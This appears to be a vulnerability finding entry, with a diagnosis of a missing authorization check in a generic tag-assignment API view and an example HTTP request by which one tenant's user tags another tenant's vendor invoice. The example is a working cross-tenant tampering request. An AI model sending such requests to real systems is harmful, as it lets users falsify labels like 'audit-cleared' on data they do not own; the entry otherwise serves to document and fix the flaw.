diagnosis: The view resolves an arbitrary model and object_id via ContentType and attaches a tag without verifying that request.user has write access to target_instance. Any user can assign tags (such as 'verified', 'audit-cleared', or 'confidential') to records belonging to other tenants.
exploit_request:
POST /api/generic/tags/assign/ HTTP/1.1
Host: saas-erp.net
Authorization: Bearer <tenant_b_user_token>
Content-Type: application/json

{"app_label": "finance", "model": "vendorinvoice", "object_id": 8831, "tag_id": 12}
